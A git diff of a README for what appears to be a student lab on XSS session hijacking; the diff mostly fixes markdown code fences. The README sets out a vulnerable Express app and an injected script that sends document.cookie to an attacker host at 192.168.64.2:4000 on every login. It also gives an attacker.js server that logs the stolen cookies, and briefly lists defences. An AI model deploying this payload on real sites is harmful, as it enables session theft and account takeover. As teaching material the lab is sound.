@@ -67,22 +67,23 @@ Edit
 ### 1️⃣ **Install Dependencies**
 ```sh
 npm install express
+```
 ###2️⃣ **Start the Vulnerable Web Server**
-
+```sh
 node server.js
+```
 The web app will start on:
 http://localhost:3000
 
----
 
 ###3️⃣ **Start the Attacker’s Server**
+```sh
 
 node attacker.js
-
+```
 The attacker server will listen for stolen cookies at:
 http://192.168.X.X:4000
 
----
 
 ### 📌 The XSS Payload (Auto Cookie Theft)
 This script is injected into the vulnerable login page (index.html) so that when the victim logs in, their cookie is stolen automatically.
@@ -90,23 +91,25 @@ This script is injected into the vulnerable login page (index.html) so that when
 ---
 
 ### 🔹 Inside index.html (before </body>)
+```html
 
 <script>
 document.getElementById("loginForm").addEventListener("submit", function() {
     fetch("http://192.168.64.2:4000/steal?cookie=" + document.cookie);
 });
 </script>
+```
 🔹 Replace 192.168.64.2 with your attacker's IP (run ip a to check).
 
 ### ✅ This ensures that every login automatically sends the session cookie to the attacker! 🎯
 
 ---
 
-📌 Attacker’s Server (attacker.js)
+### 📌 Attacker’s Server (attacker.js)
 This script captures and logs the stolen session cookies.
 
 ###🔹 Inside attacker.js
-
+```js
 const express = require('express');
 const fs = require('fs');
 const app = express();
@@ -126,7 +129,7 @@ app.get('/steal', (req, res) => {
 app.listen(4000, '0.0.0.0', () => {
     console.log('🚀 Attacker server running on http://0.0.0.0:4000');
 });
-
+```
 ---
 
 #📌 How to Defend Against This Attack
@@ -139,7 +142,7 @@ To prevent XSS-based session hijacking:
 5️⃣ Use Multi-Factor Authentication (MFA) to protect accounts.
 
 --------------------------------------------
-```
+
 #📌 CREDITS
 
 💻 Developed by: Md Tanvir Rana(AG2409), Margarita Nyman(AG2668)
